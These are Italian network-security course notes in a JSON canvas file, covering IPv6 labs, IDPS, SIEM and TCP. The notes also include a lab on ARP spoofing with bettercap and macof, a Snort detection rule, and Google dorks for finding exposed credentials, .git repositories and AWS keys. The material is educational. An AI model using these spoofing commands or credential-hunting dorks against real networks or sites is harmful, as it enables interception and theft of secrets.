		{"id":"fd2176ce38992752","type":"text","text":"\n- ***Livello Fisico*** - Un esempio può essere la ***crittografia quantistica*** (o meglio, QKD), ma vale solo a livello di modulazione del segnale;\n- ***DLL*** - Anche qui, tutte le proprietà valgono sul cavo.\n- ***Rete*** - L'implementazione più ovvia, perché va su Internet. Non la più facile, però. ***IPsec***, che è come normalmente si configura una VPN a questo livello, va settato bene;\n- ***Trasporto*** - Il layer ***SSL/TLS*** è forse quello più sicuro.\n- ***Applicazione*** - Non è considerabile una VPN, in quanto application-specific.\n","x":-9569,"y":19890,"width":504,"height":286},
		{"id":"a9d3163314090aa4","type":"text","text":"# Laboratorio 2 - `IPv6`\n\n### `Ex1`\n\nL'assegnazione statica è identica ad `IPv4` (le uniche differenze sono `inet > inet6` e `ip route > ip route -6`) . Posso provare a mandare i `ping` anche sul `Link Local`, ma dal momento che iniziano tutti per `fe80::` (qualsiasi sia il collegamento fisico a cui fanno riferimento) devo sempre specificare l'interfaccia, e.g. `ping fe80::7072:453f:1253:2245%eth0`. Anche qui, con packet sniffing si possono osservare i meccanismi di `Solicitation` che sostituiscono `ARP`.\n\n### `Ex2`\n\nPer usare SLAAC è necessario mandare i messaggi di `RA`. Linux non ha tool interni per fare da `router IPv6`, quindi bisogna usarne uno esterno: `radvd` (i.e. `Router Advertisement Daemon`), che come ogni programma ha un file di configurazione (e.g. `/etc/radvd.conf` o `/etc/radvd.d`) per specificare per ogni interfaccia cose tipo ogni quanto mandare le `RA` o qual è il prefisso di rete. Basta eseguirlo con `radvd`, verrà demonizzato in automatico (i.e. andrà ni background e sarà indipendente dalla shell, posso evitare questa cosa con `-n`). Stessa cosa per `DHCPv6`, che non è supportato da `udhcpd`. Una prima alternativa sarebbe `dibbler`, ma \"è un po' obsoleto\", quindi usiamo `dnsmasq`, che fa anche da mini-server DNS (cfr. `Ex3`).\n\nBene, con quale meccanismo generiamo gli indirizzi `IPv6` con SLAAC? In generale, sempre con `iface eth0 inet6 auto` in `/etc/network/interfaces.d/eth0` (`auto` = SLAAC) + `ifup eth0` per attivarla. Il risultato però cambia a seconda dei parametri di `sysctl`, seguiamo diversi approcci al variare del `pc`:\n\n1. Qui scrivo la roba su `interfaces` senza riflettere troppo, e mi dice bene perché di default il parametro `net.ipv6.conf.eth0.accept_ra` è settato al valore `2` (i.e. accetta le `RA` anche se `net.ipv4.ip_forward` è attivo), il che è strano. Di norma se inoltro i pacchetti sono un router, e nessuno dovrebbe venirmi a dire chi è la rete, perché la rete sono io! Insomma, per far funzionare questo banale `iface eth0 inet6 auto` + `ifup eth0` se quel parametro non fosse settato avrei due opzioni: settarlo personalmente a `2` e chissenefrega oppure a settarlo a `1` e disabilitare `net.ipv6.conf.eth0.forwarding`;\n\t- Se controllo con `ip a` appena avvio l'interfaccia potrei vedere un tag \"`tentative`\" in corrispondenza dell'indirizzo generato da SLAAC. Questo mi dice che non ha ancora fatto il controllo DAD, e se ricontrollo più tardi questo tag sparisce;\n\t- Nota che non sto specificando ***come*** SLAAC genera l'indirizzo, quindi userà il default di sistema. `cat /proc/sys/net/ipv6/conf/eth0/addr_gen_mode` restituisce `0`, quindi ci svela che ha usato EUI-64. Non bellissimo, nei prossimi `pc` faremo di meglio.\n2. Prima di `ifuppare` roba impostiamo `sysctl -w net.ipv6.conf.eth0.addr_gen_mode=3`, e forse a questo punto è utile capire cosa sono i vari valori:\n\t-  `0` - Usa EUI-64;\n\t- `1` - Usa EUI-64, ma non genera il `Link-Local` (non so bene a cosa possa essere utile). Il `kernel` potrebbe però crearlo da sé, se vuoi evitare che lo faccia devi dirgli anche `sysctl net.ipv6.conf.eth0.autoconf=0` e `sysctl net.ipv6.conf.eth0.accept_ra=0`. Vabbè;\n\t- `2` - Usa un indirizzo pseudocasuale generato a partire da uno `stable_secret` ([RFC 7217](https://datatracker.ietf.org/doc/html/rfc7217)), i.e. un parametro di `256 bit` usato in una funzione di hash (e.g. `HMAC-SHA256`) insieme al `network prefix` e all'interfaccia per sputare fuori un indirizzo che resta sempre uguale se sono connesso alla stessa rete sulla stessa interfaccia, ma che cambia appena modifico una delle due. Questo perché EUI-64 mi assegnerebbe lo stesso indirizzo statico in qualsiasi posto io sia connesso, costituendo di fatto un problema per la privacy;\n\t- `3` - Usa un indirizzo (pseudo)casuale come con il valore `2`, ma stavolta al posto di `stable_secret` uso valori casuali. Perfetto se sei ossessionato dall'idea che la CIA ti stia tracciando in giro per il mondo, un incubo per gli admin di rete che non hanno idea di chi sei.\n3. ... e qui tocca settare e usare `stable_secret`. Ne generiamo uno lungo `32 byte` (lo standard richiede una chiave ad entropia sufficientemente alta) con `openssl rand -hex 32 > /proc/sys/net/ipv6/conf/eth0/stable_secret`. Settiamo `sysctl -w net.ipv6.conf.eth0.addr_gen_mode=2`, il file `interfaces` come nostro solito et voilà (`ifup`);\n\t- Ovviamente questa cosa di generare uno `stable_secret` andrebbe fatta una sola volta, ma per motivi pratici lo mettiamo nei comandi di `startup`.\n4. Qui invece torniamo agli indirizzi EUI-64 ma usiamo anche quelli temporanei ([RFC 4941](https://datatracker.ietf.org/doc/html/rfc4941)).\n\t- Il parametro `use_tempaddr` offre come opzioni:\n\t\t- `0` - Disabilita gli indirizzi temporanei;\n\t\t- `1` - Aggiunge gli indirizzi temporanei in parallelo a quello stabile. Chiaramente quello da usare in questo caso;\n\t\t- `2` - Usa solo indirizzi temporanei, ignorando quello stabile.\n\t- Vi sono poi due parametri che definiscono i range di validità temporale di siffatti indirizzi:\n\t\t- `temp_valid_lft` definisce per quanto tempo l'indirizzo sarà ***valido***, i.e. accettato nei pacchetti in arrivo. Al termine di questo tempo l'indirizzo viene rimosso dall'interfaccia;\n\t\t- `temp_prefered_lft` definisce per quanto tempo l'indirizzo sarà ***preferito***, i.e. utilizzato per inviare pacchetti. Al termine di questo tempo l'indirizzo resta valido, ma non viene più usato come sorgente di nuove connessioni. Implicitamente mi dice anche ogni quanto generare un nuovo indirizzo temporaneo.\n\t- Impostare `user_tempaddr=1`, `temp_valid_lft=600` e `temp_prefered_lft=60` significa generare un nuovo indirizzo temporaneo ogni `60 secondi`, invalidando quelli vecchi dopo `10 minuti` dalla creazione. Segue che \"a regime\" avrò `7` indirizzi: uno stabile e `6` temporanei. <span style=\"color:rgb(236, 155, 14)\">... in teoria. In pratica fa un po' come gli pare, ma non mi interessa perderci tempo.</span>\n\n### `Ex3`\n\nQui tocca usare `Stateless DHCPv6` (i.e. `SLAAC` per gli indirizzi, `DHCPv6` per tutto il resto). Classico `iface eth0 inet6 auto` + `ifup eth0` sui client, poi\n\n- Su `pc1` modifichiamo il file `/etc/dibbler/client.conf` aggiungendo la riga `stateless` (`SLAAC`) e specificando `iface eth0 { option dns-server }` per farci dare il server DNS come parametro di connessione, poi avviamo con `dibbler-client run`;\n- Su `pc2` basta avviare `dhclient` per `IPv6` in modalità `stateless` sull'interfaccia `eth0`, i.e. `dhclient -6 -S eth0`.\n\t- Nota che entrambi i client vanno avviati dopo il server, motivo per cui è utile mettere una `sleep 10` nei file `.startup` prima di `dibbler` e `dhclient`.\n\nIl server, i.e. `r1`, è un pelo più noioso da settare. Intanto è richiesto che abbia solo indirizzi con parte host `::1`, quindi li assegniamo manualmente. Poi tocca configurare il server `dnsmasq`, che in mezzo al mare di opzioni si riduce a poca roba che si trova sulla VM, non ho voglia di scrivere quelle cose. La cosa bella di `dnsmasq` è che gestisce sia `IPv6` che `IPv4` in parallelo e quindi fa un DB DNS comune rendendo più semplice la risoluzione dei nomi.\n\n### `Ex4`\n\nQui facciamo Prefix Delegation.\n\n\n### `Ex5`\n\nMTU, prova con quello alto e poi adattati alla size sniffando i pacchetti (ICMPv6 Packet Too Big)\n\n### `Ex6`\n\nTunneling `IPv4` - Se non ho un router con un indirizzo Global Unicast posso incapsulare i pacchetti `IPv6` dentro `IPv4` creando un tunnel verso la destinazione (vedi slides 09 e in caso serva il loro commento live lezione 3/4/25) [reference](https://tunnelbroker.net/) per creare i tunnel\n\n<span style=\"color:rgb(236, 155, 14)\">Sto lasciando questi esercizi a metà perché mi sembrano troppo specifici e ho poca voglia. In caso, pacchi di slides 8 e 9.</span>","x":-9570,"y":13932,"width":1259,"height":2413,"color":"3"},
		{"id":"1df3ef91eb79a52c","type":"text","text":"# Terzo Assignment  - VPN","x":-17129,"y":29192,"width":1259,"height":2379,"color":"3"},
		{"id":"8d12896b3d98c953","type":"text","text":"# dove metto il server VPN??","x":-12059,"y":19867,"width":259,"height":133,"color":"1"},
		{"id":"bb7a2d36eba3b851","type":"text","text":"peaboating activity? attacker usa il mio sistema come sorgente degli attacchi","x":-9700,"y":27680,"width":293,"height":118},
		{"id":"252d6a57c9e5633f","type":"file","file":"IDPS_Working_Flows.png","x":-11592,"y":26853,"width":758,"height":403},
		{"id":"9b089992127efb2a","type":"text","text":"# Anomaly Detection via Data Mining\n\nDecidere *cosa* guardare per prendere le decisioni e *come* guardarlo è tutt'altro che scontato.\n\nSe con un Signature-based posso appoggiarmi a pattern noti, con il Behavior-based è impossibile. Sono costretto a *capire* il comportamento tipico della mia rete, se voglio discriminare un comportamento anomalo, e tutto questo va fatto a partire da tonnellate di dati dai quali devo riconoscere ed estrarre le features più significative. \n\nQuesto si traduce ovviamente in un massiccio uso di algoritmi di Machine Learning: clustering, classificazione, regole associative, PCA... tutto per cercare correlazioni, strutture e comportamenti nascosti nei dati. In due parole: devo fare ***Data Mining***. Di norma le metriche sono due:\n\n- ***Distanza*** - Tipicamente si usano ***Hamming Distance*** (i.e. \"quanti elementi devono essere cambiati per rendere il pattern `A` uguale al patter `B`?\") e ***Kolmogorov Complexity*** (i.e. \"quanta differenza di ***densità di informazione*** c'è tra i due pattern?\");\n- ***Probabilità*** - Qui rispondiamo genericamente alla domanda \"Quanto è verosimile questa sequenza?\" tramite Catene di Markov o Reti Neurali.\n\nTutto risolto quindi? No. Con l'evolversi dei protocolli cambiano anche le features più significative per discriminare gli attacchi, motivo per cui ancora oggi è un campo di ricerca molto attivo.\n\n- I primi modelli prevedevano features come `content` che oggi con `TLS` sono inaccessibili;\n- Anche evolvendo le features da considerare, gli attaccanti diventano bravi a mascherarle;\n- Se decidiamo di usare una rete neurale per individuarle perdiamo in interpretabilità, motivo per cui il nostro IDS scatta e noi non abbiamo la minima idea del perché.\n\nOltre a questo, serve ovviamente flessibilità sulle nuove azioni legittime che intraprendo. Mettiamo tutto sotto il grande cappello dell'espressione \"***Self-Learning***\".","x":-11592,"y":25186,"width":759,"height":1089,"color":"4"},
		{"id":"b1381784fab95179","type":"file","file":"IDPS_RuleEvasion.png","x":-10580,"y":28210,"width":759,"height":337},
		{"id":"9e1457e080b8b42e","type":"text","text":"# Misuse Detection via Fingerprinting\n\nQui andiamo di reverse engineering e manualmente ricaviamo le firme caratteristiche di entità dannose. Un virus sarà un file con un certo hash che posso confrontare facilmente con quelli dei file che osservo, una mail che prova a fare phishing conterrà delle parole chiave note, attacchi come SQL Injection contengono spesso cose come `OR 1=1`.\n\nQuesto può portare a DB enormi che vanno confrontati con tonnellate di dati dei payload di ogni pacchetto. Non stupisce che una cosa del genere sia super ***energivora***, e che quindi l'obiettivo (oltre ovviamente all'efficacia) sia l'efficienza.\n\nDi fatto tutto questo si riduce ad una serie di regole scritte in file come `/etc/XXX/rules` (dove `XXX` è l'IDPS utilizzato, e.g. `snort` o `suricata`), della forma\n\n```\nACTION PROTOCOL SOURCE_IP/PORT DESTINATION_IP/PORT OPTIONS\n```\n\ne.g. `alert tcp any any -> 10.1.1.0/24 80 (content: \"/cgi-bin/phf\";)`: se ispezionando un pacchetto `TCP` diretto a `10.1.1.0/24` sulla porta `80` trovi come contenuto `/cgi-bin/phf` (i.e. la fingerprint di un vecchio script di `command injection`) , manda un segnale di `alert`. \n\nIndividuare le fingerprint per scrivere delle buone regole è un lavoro che viene sempre più spesso automatizzato (e.g. clustering, ANN). Questo presuppone di avere un gran quantitativo di dati a disposizione, da cui la domanda: come creo il dataset? Ok, lo scarico da qualche parte, ma come lo ha costruito colui che lo ha creato? Mi serve un'esca. Espongo una macchina (detta ***honeypot***) alla rete, senza difese (e magari senza dati sensibili). Lascio che gli attaccanti si divertano, raccogliendo dati su tutto quello che fanno. \n\nFacile, no? Difesa `1`, Attacco `0`? A volte, ma  se sono furbo cerco di fare ***rule evasion***: cerchi delle parole chiave nel payload? E io lo splitto su diversi pacchetti. Consideri le sequenze di pacchetti? E io li mando in disordine, o modifico il `TTL`. L'unico limite dell'attaccante è la sua immaginazione.\nIn riferimento all'immagine a destra,\n\n- Per l'insertion attack, il NIDS dovrebbe verificare anche il checksum e leggere il risultato;\n- Per il TTL attack, dovrebbe valutare cosa arriva effettivamente all'host.\n\n\nAnche così non è in grado di ispezionare il traffico crittato. Di fatto serve sempre un ***forward proxy*** o un ***reverse proxy***, o comunque intercettare il traffico prima (o dopo, dipende dal verso della connessione) del server (e.g. ***VPN***) che lo critta.\n\n","x":-11592,"y":27834,"width":759,"height":1089,"color":"4"},
		{"id":"5dc487a7d73687cf","type":"text","text":"# Security Information and Event Management (SIEM)\n\nQui vogliamo generalizzare e astrarre un po' il concetto di IDPS.\n\n- Per fare le analisi ci serve un DB. Chiamiamo ***SIM*** (***Security Information Management***) l'entità (anche distribuita) che raccoglie i dati di `log` e sulla base di questi manda gli `alert`;\n\t- Di fatto le varie macchine sulla rete mandano i propri `log` al SIM, il quale li uniforma.\n- Bisogna anche analizzare i dati in tempo reale. Il ***SEM*** (***Security Event Management***) è l'entità (anche distribuita) che stabilisce le correlazioni e sulla  base di questi manda gli `alert`.\n\nIl SIEM è l'unione di queste due cose. \"Ma non stai solo dando un altro nome a IDS e IPS?\"... non proprio. Quelli sono singoli SW (e.g. un IDS si concentra su un certo tipo di dati), queste sono entità che raccolgono dati da diversi SW. Poi, è ovvio che fanno cose simili a un IDPS, infatti ne sono una generalizzazione. \n\nContinuo a chiamarle \"entità\" proprio perché non essendo un singolo SW non ne esiste una vera e propria standardizzazione. Semmai possiamo parlare di ***compliance***: se uso una simile entità in un'azienda o simili, devo rispettare le loro regole. Non è detto che si possa sempre fare: metti che la policy ti vieta di conservare un certo valore che però sarebbe la chiave primaria del tuo DB. Salvo situazioni del genere, devi anche mostrare che il tuo SIEM è, appunto, compliant.\n\nBene, a che mi serve tutto questo?\n\n- Metti che a un certo punto scatta un IDS. Sulla base dei suoi dati, a partire dal DB posso ***cercare lo stesso pattern in macchine diverse o eventi passati***, per ***seguire la traccia*** di quel particolare evento, e magari interpretarla (***correlazione***);\n- L'azienda ha ***policy*** del tipo \"tutte le macchine devono avere l'ultima versione del SO\", oppure \"ogni utente deve cambiare la password ogni 3 mesi\". Visto che nel SIEM abbiamo i file di log di tutti i partecipanti, è facile controllare queste cose e produrre dei ***report***;\n\t- Ovviamente qui esiste anche l'***active response***, e.g. manda un `alert` all'utente che non ha cambiato la `password` in tempo, o direttamente triggera gli update.\n- Incrociando i dati posso notare che un certo `IP` è stato già associato ad attacchi. Arricchire i `raw data` presi dai log può migliorare enormemente la mia comprensione del sistema, nonché la qualità delle azioni (e.g. se vedo un `IP` certamente fraudolento, giù di azioni pesanti. Se fosse solo sospetto, per evitare di bloccare cose legittime dovrei attuare azioni più blande).\n\nTutto questo viene generalmente riassunto in interfacce di livello molto alto, che sono quasi piacevoli da guardare e analizzare (vedi immagine).\n\nEsempi di SIEM sono ***Graylog***, Splunk, LogStash, ma vengono prodotti anche da Microsoft e IBM.","x":-12601,"y":26510,"width":759,"height":1089,"color":"4"},
		{"id":"d68c135cc521fa55","type":"text","text":"# Threat Intelligence & Digital Forensics\n\nTutto questo si generalizza  a livello di Internet con l'idea di ***Threat Intelligence***, che di fatto è un \"SIEM globale\".\n\nThreat intelligence feeds and reports help security officers in making\ndecisions concerning organizational security\nThreat intelligence is the analysis of data using tools and techniques to\ngenerate meaningful information about existing or emerging threats\ntargeting the organization that helps mitigate risks\nThreat Intelligence helps organizations make faster, more informed\nsecurity decisions and change their behavior from reactive to proactive\nto combat the attacks\n\nDigital forensic science is a branch of forensic science focused on the\nrecovery and investigation of material found in digital devices and\ncybercrimes\nDigital forensics was originally used as a synonym for computer\nforensics but has expanded to cover the investigation of all devices that\nstore digital data\nDigital forensics is concerned with the identification, preservation,\nexamination and analysis of digital evidence, using scientifically\naccepted and validated processes, to be used in and outside of a court\nof law","x":-13610,"y":26510,"width":759,"height":1089,"color":"3"},
		{"id":"83ecc46176258f59","type":"file","file":"SIEM_GUI.png","x":-12601,"y":25914,"width":759,"height":361},
		{"id":"4ef3586172cf96d4","type":"text","text":"# Intrusion Detection and Prevention System (IDPS)\n\nDi fatto è un algoritmo di Machine Learning in classificazione che ha la possibilità di prendere delle contromisure in base alla classe predetta. Prendiamo i pacchetti sniffati, estraiamo le features e ci basiamo su dati e/o addestramenti stato-dell-arte per sapere come sono fatti in genere i contenuti pericolosi (e.g. porte utilizzate, numero di pacchetti, dimensione, numero di connessioni aperte).\n\nPuò essere implementato a diversi livelli:\n\n- ***Host IDPS*** - Si occupa solo del singolo host, ed è ovviamente molto più potente: può accedere ad informazioni di basso livello (e.g. quali processi girano tipicamente e quali risultano anomali) nonché ai payload decrittati;\n\t- \"Vabbè, ma è un antivirus!\"... no. Intanto un antivirus lavora solo su dati \"statici\" (e.g. firme sospette, euristiche) cercando malware noti, mentre un HIDPS è più \"dinamico\" (i.e. cerca pattern comportamentali). E poi, mentre il primo lavora a livello di filesystem, isolando o bloccando singoli processi, il secondo blocca tentativi di accesso o privilege escalation. Piuttosto, funzionano molto bene insieme;\n\t- Ne è un esempio ***FakeToBan***.\n- ***Network IDPS*** - Quello a cui penseresti normalmente, lo metti dietro al firewall. Ha anche senso ***distribuirlo*** con diversi punti di raccolta in tutta la LAN.\n\t- Ne sono esempi ***Suricata*** e ***Opnsense***, e sono tipicamente molto energivori (analizzare costantemente il traffico di un'intera rete è un compito pesante).\n- ***Wireless IDPS*** - Più rari e molto situazionali.\n\nAltre tipologie sono possibili, ma qui ci interessano poco. Piuttosto, da cosa vogliamo proteggerci?\n\n- ***Reconnaissance*** - L'attaccante cerca di capire le caratteristiche della mia rete (e.g. quanti host hanno porte `SSH` aperte, quanti hanno un server web attivo, ...). È chiaramente anomalo che qualcuno faccia uno scan della rete locale;\n- ***Patterns*** - \"Perché stai facendo così tanti tentativi di accesso `SSH` con `username` e `password`? Un utente autorizzato dovrebbe avere un certificato, no?\", \"Perché stai aprendo tutti i file del computer per poi riscriverli crittati?\". Ma anche ovvi schemi di ***SQL Injection***, campi degli header malformati, e simili;\n- ***Connessioni*** - Se il server che è pensato per comunicare solo in LAN prova ad aprire una connessione verso l'esterno, forse c'è qualcosa che non va.\n\nNel farlo, posso seguire uno dei due approcci descritti nell'immagine sopra.  O magari entrambi: il ***Behavior-based*** è più suscettibile ai falsi positivi (banalmente, qualsiasi nuova azione è diversa dalla norma fino a quel momento), mentre il ***Signature-based*** ai falsi negativi (è impossibile avere sempre una lista esaustiva di tutti i possibili pattern di attacco). Come spesso accade in questi casi, la scelta migliore è usarli entrambi e prendere le decisioni in base alla combinazione dei risultati.\n\nOggi questi concetti si fondono in quello di ***EDR*** (***Endpoint Detection and Response***).","x":-10580,"y":26510,"width":759,"height":1089,"color":"4"},
		{"id":"228a3066f58af835","type":"text","text":"# SSL/TLS\n\nsicurezza su TCP, che diventa protetto con authentication e (confidentiality?)\n\nsegue descrizione del protocollo. e delle certification authorities \"you can expect a question on that\".\n\n# Questo pezzo non so dove va...\n","x":2656,"y":19926,"width":796,"height":440},
		{"id":"9b170940a22e2312","type":"text","text":"\n\nnon è proprio vero che gli IPv4 pubblici sono unici. Pensa a DNS. L'IP di un root nameserver nasconde dietro N servers. dipende da chi pubblicizza quell'indirizzo pubblico.\n\nUna buona risposta al DDOS è ad esempio che qunado mi rendo conto di essere bersagliato faccio pubblicizzare lo stesso IP a diversi ISP in modo da distribuire il traffico (anycast). Questa roba la fa Cloudfare (che ti chiede di fare un check di umanità)\n\n\n\n(sì ma che c'entra qua?)","x":1419,"y":20515,"width":480,"height":342},
		{"id":"810088b3cb4ce9e8","type":"text","text":"# IPv6 Setting\n\nquando faccio Prefix Delegation i 64 bit di rete sono così divisi\n\n- i primi tre hextet sono stabiliti dall'ISP che delega\n- l'ultimo è diviso in due byte (o 4 nibbles, i.e. coppie di hex)\n\t- il primo definisce in quale sottorete ACME siamo (e.g. `ACME-90` sarà `5A`, nel nostro caso `03` resta `3`)\n\t- il secondo lo uso io per fare subnetting. dividiamo la rete in 4 sottoreti, i.e. `00`, `40`, `80` e `B0`. Assegniamo le prime due al main firewall e le altre due all'internal. Segue che (e.g.) qualsiasi host connesso all'internal firewall ha come quarto hextet una roba del tipo `3XY` dove `X` va da `8` a `F` e `Y` da `0` a `F`. Chiaro no?\n\nQuindi abbiamo dentro `ACME-03` abbiamo indirizzi `/56`. Li dividiamo in 4 sottoreti","x":1280,"y":21171,"width":759,"height":668},
		{"id":"be38eea5ec0fbd77","type":"text","text":"# Handshaking TCP (Reti di Elaboratori)\n\nIl server configura un ***welcome socket*** su una coppia `(IP, porta)` predefinita per eseguire l'handshaking. Quando il client manda una richiesta di connessione al welcome socket, vengono concordati i ***parametri di connessione***. Se va tutto bene, la connessione viene spostata su un altro server socket *ad-hoc*, e il welcome socket torna in ascolto.\n\nTCP usa un ***3-Way Handshaking***:\n\n- Il ***client*** sceglie un proprio numero di sequenza casuale `x` da cui partire e invia un segmento con il bit `SYN = 1` (sincronizzazione, ovvero \"`voglio stabilire una connessione`\"), ed entra in uno stato `SYNSENT` (***richiesta inviata***);\n\t- Generare un ***Initial Sequence Number*** (***ISN***) `x` difficilmente indovinabile è cruciale per la sicurezza, come spiegato nel riquadro a fianco. In origine TCP usava modi poco robusti (e.g. `timestamp x costante` o `hash(IP, porta)`), e quindi facilmente indovinabili con brute-force, ma recentemente si sono prese migliori contromisure (e.g. migliore randmizzazione, firewall, `SYN Cookies` e validazioni profonde).\n- Il ***server*** sceglie un proprio numero di sequenza casuale `y` da cui partire e risponde con un messaggio di tipo `SYNACK` (`SYN = 1`, sono in fase di handshaking, `ACK = 1`, sto mandando un `ACK`, `ACK# = x + 1`, mandami il numero di sequenza `x + 1`). Il server entra in uno stato `SYNRCVD` (***richiesta ricevuta***);\n- Il ***client*** riceve `SYNACK`, sa che il server c'è. Invia un `ACK` chiedendo `y + 1` e può contestualmente iniziare a trasmettere: per lui la connessione è `ESTAB` (***established***);\n- Il server riceve l'`ACK`, sa che il client c'è: anche per il server la connessione è `ESTAB`. Il welcoming socket procede a chiamare `accept()`, i.e. la `syscall` che sposta la connessione dal welcome socket a quello definitivo.\n\nChi vuole chiudere una connessione TCP invia un segmento con il flag `FIN = 1`. Se l'altra risponde con un `FIN ACK`, questo sancisce la chiusura di \"mezza\" connessione (i.e. una delle due parti ha chiuso la connessione). L'altra mezza verrà chiusa una volta che il sender originale avrà ricevuto il `FIN ACK`.","x":-3772,"y":9930,"width":759,"height":1105,"color":"4"},
		{"id":"451c34e7548fb2b4","type":"text","text":"# Laboratorio 3 - Attacchi Link-Local\n\nprima wifi securiy er wired-equivalent privacy (cerca, tipo che tutti hanno la stessa chiave di crittografia). se intercetti i primi pacchetti di una connessione (e.g. con AirCrack su Kali) puoi risalire alla chiave. oggi ogni host usa una chiave dedicata, come se fosse una connessione punto-punto (diverso quindi da wired equivalent privacy). bridge è collegamento tra due ethernet, swich è bridge multiport (?)\n\nvabbè qui l'idea è provare a fare attacchi link local.\n\n1999 ***CAM Overflow*** con `macof`. Quello che succede dopo non è ovvio. Se lo switch inizia a fare flooding daje, altrimeni potrebbe crashare o bloccarsi. per difendermi faccio port security, i.e. ogni porta può ricevere pacchetti da massimo N MAC Addresses. Se ne arrivano di più, stacco la porta.\n\nAltrimenti ARP Spoofing, come descritto sopra (cfr Cattura Standard o Aggressiva?). Gli switch hanno le CAM tables (MAC/PORTA) mentre gli host hanno le ARP tables (IP/MAC). Unused MAC are removed. come faccio spoofing? esiste una gratuitous ARP response che è tipo una unsolicited advertisement con cui pubblico la mia associazione. l'host 1.1.1.2 si pubblicizza ripetutamente come 1.1.1.254 (il router) in modo che tutti passino da lui. posso iniziare a pensare di fare MitM. Posso farlo con il router, il DNS, un altro host...\n\ncontromisure? se uso SSH/SSL posso ancora fare questo attacco ma diventa più difficile. Vedi VPN?? ( why )\n\n\nLAB\n\nbettercap ha diversi modi per funzionare, tra cui GUI e CLI. La seconda è come una shell con comandi e ha diversi script preimpostati\n\n- net.probe on - attiva un arp scan, mentre net.show ti mostr tutti quelli trovati in tabella. quando fai `on` su qualcosa quello inizia a runnare in background\n- controlla anche i vari `set` come\n\t- gateway.address XXX\n\t- arp.spoof.\n\t\t- internal true\n\t\t- fullduplex true\n\t\t- targets XXX YYY ZZZ per specificare su chi devo fare spoofing (posso fare più interfacce sullo stesso collegamento fisico? penso di sì, ipv6 mette almeno un link local e un GUA)\n\n\nil risultato del poisoning è che alla fine tutti associano tutti gli indirizzi allo stesso MAC (se metto tutti come target, altrimenti è switchato solo il target. cioè se il target è A con MAC B e io sono C con MAC D, alla fine del processo tutti gli altri vedranno A con MAC D e C con MAC D).\n\nfamo che il target è il server. se qualcuno manda una syn per aprire una connessione col server, la manda al mio mac. io però faccio una retransmission (quindi bettercap è visibile, in qualche modo. wireshark lo vede che stai ritrasmettendo.) per reindirizzarla al server. Ovviamente (?) questo è inutile su un cavo ethernet condiviso da tutti, ma è efficace se c'è di mezzo uno switch.\n\nDetta così sembra inutile. A che serve solo reindirizzare? Vabbè a leggere, ma posso anche modificare! è il momento del proxy script! Vedi rec... in pratica è uno (java)script che cerca il body e sostituisce kitten.jpeg con un'altra foto. Tutto questo obv perché sono in chiaro.\n\nprocede con le stesse cose versione IPv6 mi sa\n\nun DoS con IPv6 è: quando fai DAD ti dico che l'indirizzo che hai scelto non va bene. a spam. non prenderai mai un GUA e non ti collegherai mai alla rete.\n\npoi spoofing se posso creare dei messaggi rogue RA (obv). se poi faccio flooding di RA ci sono i vecchi SO che li processano tutti, quindi proprio DoS easy\n\nin modo analogo posso fare da rogue DHCP server, DNS, e abusare di redirect.\n\nsegue ex4 ed ex5 sulla falsariga di ciò. vedi rec perché mi so scocciato dopo due ore e mezza\n\n\nSOURCE DESTINATION FLOW ...... DATI\n\n192.168... 100.100...... -- -- -- CIAO COME STAI","x":-2513,"y":15132,"width":1259,"height":1213,"color":"1"},
		{"id":"6187994dc5ea5ada","type":"text","text":"# Google Hacking / Dorking (ChatGPT)\n\nÈ l’arte di usare gli **operatori avanzati dei motori di ricerca** per estrarre informazioni specifiche e nascoste da pagine web pubbliche. Non è magia: è ricerca strutturata. Invece di cercare “backup”, chiedi al motore: “dammi **solo** file .sql che contengono la parola _password_ sul dominio X”.\n\n###### Operatori utili (lista pratica)\n\n- `site:example.com` → limita la ricerca a un dominio.\n- `filetype:pdf | filetype:sql | filetype:env` → cerca tipi di file.\n- `inurl:admin | inurl:login` → URL che contengono una stringa.\n- `intitle:\"index of\"` → directory listing esposti.\n- `cache:example.com/page` → versione cache del motore.\n- `\"exact phrase\"` → frase esatta.\n- `-site:example.com` → escludi un dominio.\n- `site:github.com \"API_KEY\"` → cerca chiavi pubblicate su GitHub.\n- `site:example.com ext:sql \"password\"` → combinazione potente (alcuni motori supportano `ext:` come `filetype:`).\n\n###### Esempi di dork efficaci\n\n- `site:example.com filetype:sql \"password\"` → dump SQL che contengono “password”.\n- `site:example.com inurl:/.git/` → repository Git esposti (puoi estrarre sorgente e segreti).\n- `intitle:\"index of\" db_backup` → directory listing con backup.\n- `site:example.com inurl:admin` → pagine di admin esposte.\n- `site:github.com \"AKIA\" \"amazonaws.com\"` → chiavi AWS pubblicate su GitHub.\n\n###### Metodo pratico (workflow)\n\n1. **Definisci obiettivo**: dominio azienda, persona, tecnologia.\n2. **Scegli operatori** secondo l’informazione che cerchi (config, backup, credenziali, endpoint).\n3. **Componi dork** semplice → raffina iterativamente (es. aggiungi `filetype:` o `-site:`).\n4. **Analizza risultati**: guarda file, pagine archiviate, Git repos.\n5. **Automatizza** (con cautela) per scala minima: script che salvi i risultati e rimuova duplicati.\n6. **Documenta**: URL, screenshot, timestamp — info cambiano nel tempo.\n\n###### Etica e limiti legali\n\n- Cercare dati pubblici è _legale_ nella stragrande maggioranza dei casi, ma **scaricare, usare o pubblicare** dati sensibili (credenziali private, dati personali) può avere implicazioni legali.    \n- **Non** usare dork per accedere a sistemi protetti o per sfruttare le informazioni trovate senza autorizzazione.\n- Rispetta ToS dei motori: scraping massivo può violarli.\n\n###### Strumenti che aiutano\n\n- **theHarvester** (OSINT aggregator) integra Google, Bing, Shodan.\n- **GHDB (Google Hacking Database)** — collezione di dork noti e funzionali.\n- **Recon-ng** — moduli che automatizzano query e raccolta.\n- Script semplici in Python usando `requests`/Selenium per formare query e salvare output (attenzione ToS).\n\n###### Uso fuori dal cybersec (perché è utile anche allargato)\n\n- **Brand monitoring**: trovi leak pubblici di documenti dell’azienda.\n- **Compliance / Data Protection**: scovi dati personali esposti per rimozione (GDPR).\n- **Legal eDiscovery**: recuperi vecchie pagine, backup, prove.\n- **Research storica**: Wayback + dorking trova versioni vecchie di siti, comunicati cancellati.\n- **DevOps / QA**: verifica che file di config o `.env` non siano pubblicati accidentalmente.\n\n###### Contromisure pratiche (checklist rapida per difendersi)\n\n- Non memorizzare segreti in repo pubblici; scansiona GitHub per leak.\n- Disabilita directory listing (`index of`).\n- Rimuovi file di backup da webroot e proteggi `.git`, `.env`, config.\n- Usare robots.txt non è protezione — serve policy solo ai crawler benigni.\n- Monitoraggio: impostare alert (Google Alerts, GitHub notifications, Shodan) su pattern critici.\n- Scansione regolare con dorking controllato per trovare esposti (policy 